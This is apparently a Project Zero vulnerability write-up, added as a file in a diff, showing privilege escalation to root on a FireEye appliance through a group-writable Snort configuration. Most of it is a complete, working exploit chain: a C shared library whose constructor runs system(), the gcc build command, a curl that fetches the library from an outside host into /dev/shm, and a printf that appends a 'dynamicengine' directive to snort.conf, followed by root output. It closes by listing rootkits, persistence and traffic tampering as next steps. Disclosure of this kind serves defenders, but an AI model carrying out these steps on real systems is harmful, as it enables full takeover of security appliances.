@@ -1,0 +1,38 @@
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=670
+
+The mip user is already quite privileged, capable of accessing sensitive network data. However, as the child process has supplementary gid contents, there is a very simple privilege escalation to root. This is because the snort configuration is writable by that group:
+
+$ ls -l /data/snort/config/snort.conf
+-rw-rw-r-- 1 fenet contents 1332 Dec  2 18:02 /data/snort/config/snort.conf
+
+This can be exploited by placing a shared library in a writable directory that is mounted with the “exec” option, and appending a “dynamicengine” directive to the snort configuration.
+
+# mount | grep -v noexec | grep rw 
+...
+/dev/sda8 on /var type ext4 (rw,noatime)
+/dev/sda11 on /data type ext4 (rw,noatime)
+/dev/sda9 on /data/db type ext4 (rw,noatime,barrier=0)
+tmpfs on /dev/shm type tmpfs (rw)
+
+It looks like /dev/shm is a good candidate for storing a shared library.
+
+First, I create and compile a shared library on my workstation, as there is no compiler available on the FireEye appliance:
+
+$ cat test.c 
+void __attribute__((constructor)) init(void)
+{
+        system("/usr/bin/id > /tmp/output.txt");
+}
+$ gcc test.c -shared -s -fPIC -o test.so
+
+Now fetch that object on the FireEye machine, and instruct snort to load it:
+
+fireeye$ curl http://example.com/test.so > /dev/shm/test.so
+fireeye$ printf “dynamicengine /dev/shm/test.so\n” >> /data/snort/config/snort.conf
+
+The snort process is regularly restarted to process new rules, so simply wait for the snort process to respawn, and verify we were able to execute commands as root:
+
+fireeye$ cat /tmp/output.txt                                                           
+uid=0(admin) gid=0(root) groups=0(root)
+
+And now we’re root, with complete control of the FireEye machine. We can load a rootkit, persist across reboots or factory resets, inspect or modify traffic, or perform any other action.
